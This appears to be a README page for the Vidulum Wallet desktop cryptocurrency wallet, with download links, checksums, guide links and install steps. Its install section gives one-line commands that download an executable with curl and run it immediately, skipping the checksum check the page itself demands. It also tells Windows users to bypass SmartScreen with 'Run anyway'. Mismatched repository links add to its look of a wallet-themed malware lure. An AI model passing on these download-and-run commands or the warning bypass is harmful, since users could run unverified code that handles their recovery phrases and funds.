![Vidulum Wallet](assets/banner-app.png)

# Vidulum Wallet desktop application

One multichain wallet for Windows, macOS and Linux, with a single recovery phrase behind every address.

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/blob/dev/LICENSE.md"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

## SHA-256 checksums
<!-- SHA256-BEGIN -->
| File | SHA-256 |
| --- | --- |
| [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) | `82a7d48d863fcc0806fa0af133a06ecaaaad69e40b26786aef3e8730c01389da` |
| [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) | `d60c5cd92b22f6cca5a7ba1a7f57151b37f1790ce9f39650c6a3b9569e875574` |
| [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) | `e1211ca95485b36bb629220ae763a09cbd69760f160ba612fdb24f666c511f83` |
<!-- SHA256-END -->

Check on Windows: `certutil -hashfile <file> SHA256`; macOS: `shasum -a 256 <file>`; Linux: `sha256sum <file>`.
Every character must match. If it differs, do not run the file; delete it and download again from the linked GitHub release.

> Every installer on this page is published from this repository's releases. A build offered anywhere else, including a forum attachment or a third-party APK site, is not one of these files.

## What this repository is for

This is the home of the Vidulum Wallet desktop application and the only place its installers are published. Three files ship for v2.2.1: a Windows executable, a macOS disk image and a Linux archive. Each one is listed above with the exact filename, the platform it runs on and the checksum of the file you should receive.

The application holds <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-multichain-wallet-cosmos-utxo-evm-solana.md">Vidulum Wallet multichain network list</a> across four families - Cosmos, UTXO, EVM and Solana - and derives the addresses for all of them from one recovery phrase. Holding, sending and receiving work per chain, and each chain pays its fee in its own coin. The software generates and stores your keys locally; neither the project nor any support channel holds a copy, which is why a phrase can be rebuilt but never reset.

This repository also carries the release notes and the checksums. The written guidance lives in <a href="https://github.com/vidulum-app/vidulum-wallet-guides">Vidulum Wallet setup and recovery guides</a>, so a reader looking for install steps, a failed send or a staking question can go straight to the page that answers it instead of searching a changelog.

## Who it is for

- People who want one desktop application for several chains rather than a separate wallet per network.
- Readers who already hold a recovery phrase and need to restore it into a supported build.
- Anyone checking whether a downloaded installer is the published file before running it.
- Users comparing desktop custody with a web wallet or an exchange balance.

## Start here

The install walkthrough is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-download-windows-macos-linux.md">Vidulum Wallet download for Windows, macOS and Linux</a>, which matches each installer to its platform and shows how to check the file you received.

Restoring an existing wallet is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md">Vidulum Wallet recovery phrase restore</a>, which runs from the phrase to a working balance in four steps.

Which chains the wallet holds is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-multichain-wallet-cosmos-utxo-evm-solana.md">Vidulum Wallet multichain network list</a>, including the address formats that decide where a send can go.

Replacing an older install is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-update-replacing-program.md">Vidulum Wallet update to v2.2.1</a>, which keeps wallet data while the program changes.

## How to use these guides

1. Pick the installer that matches your operating system from the table above.
2. Compare the downloaded file against the checksum listed in this README.
3. Follow the platform section below, or the download guide if a step looks different on your machine.
4. Open the application and restore your phrase, or create a new wallet if this is your first install.
5. Keep the phrase offline before you send anything to an address.

## Where the guides live

The application repository carries the software and the release notes. The written guidance sits in three hubs, split by what a reader is trying to do.

| Hub | What it answers |
| --- | --- |
| <a href="https://github.com/vidulum-app/vidulum-wallet-guides">Vidulum Wallet setup and recovery guides</a> | installers per platform, restoring a phrase, private keys, login, updates and fees |
| <a href="https://github.com/vidulum-app/vidulum-wallet-help">Vidulum Wallet fixes and verification guides</a> | failed sends, disconnected chains, missing balances, APK and build checks, support |
| <a href="https://github.com/vidulum-app/vidulum-wallet-staking">Vidulum Wallet networks and rewards guides</a> | chain coverage, the VDL reward programme, interest terms, comparisons |

## What each guide changes

| Task | Guide | Outcome |
| --- | --- | --- |
| Install on a new machine | <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-download-windows-macos-linux.md">Vidulum Wallet download for Windows, macOS and Linux</a> | the published file, extracted and running |
| Move an existing wallet | <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md">Vidulum Wallet recovery phrase restore</a> | the same addresses and balances |
| Understand chain coverage | <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-multichain-wallet-cosmos-utxo-evm-solana.md">Vidulum Wallet multichain network list</a> | a clear picture of what is held |
| Diagnose a failed send | <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md">Vidulum Wallet send error checks</a> | the cause, in four checks |
| Replace an old build | <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-update-replacing-program.md">Vidulum Wallet update to v2.2.1</a> | new program, same wallet data |

## Common first questions

### Is the download on this page the real one?

Yes, if the file you saved matches the checksum above and came from <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/">Vidulum Wallet v2.2.1 release</a>. A copy from anywhere else is unverified, whatever it claims to be.

### Do I need a new wallet to install this version?

No. Installing or updating the program does not change the wallet it holds; the <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md">Vidulum Wallet recovery phrase restore</a> is the same phrase that rebuilds the same addresses.

### What happens if I lose the recovery phrase?

Nothing can recover it. Keys are generated locally and no copy exists elsewhere, so the <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-restore-wallet-recovery-phrase.md">Vidulum Wallet recovery phrase restore</a> is the only route back to the balances.

## Verifying a download before you run it

A checksum is only useful if both numbers come from the same place. Copy the line for your platform from this page, then run the matching command against the file you saved. On Windows that is `certutil -hashfile`, on macOS `shasum -a 256`, on Linux `sha256sum`. The output is long; compare it character by character rather than by eye.

If the two strings differ, the file is not the published one. Delete it rather than running it, and download again from <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/">Vidulum Wallet v2.2.1 release</a> linked above. A mismatch is not a coin flip you can reason about: it means the bytes on disk are different from the bytes the project signed off.

Two habits make this quick. Keep the release page open while you check, so the expected value is never from memory. And check before the first launch, not after, because a build only has to run once to read what it wants.

## Before you install

- Confirm the operating system and architecture from the table above.
- Save the checksum line for your platform before you download.
- Have your recovery phrase to hand only if you are restoring an existing wallet.
- Close any other wallet software that might compete for the same address book.

## About and license

Vidulum Wallet is published by the Vidulum project under the MIT license; the terms are in <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/blob/dev/LICENSE.md">the LICENSE file</a>. Release notes for v2.2.1 are on <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a>, and the written guides are in the three hub repositories listed above.

## How to install Vidulum Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip wallet.zip -d vidulum-linux`.
3. Make the extracted program executable: `chmod +x vidulum-linux/vidulum-wallet-desktop`.
4. Run it from that folder.
<!-- INSTALL-END -->
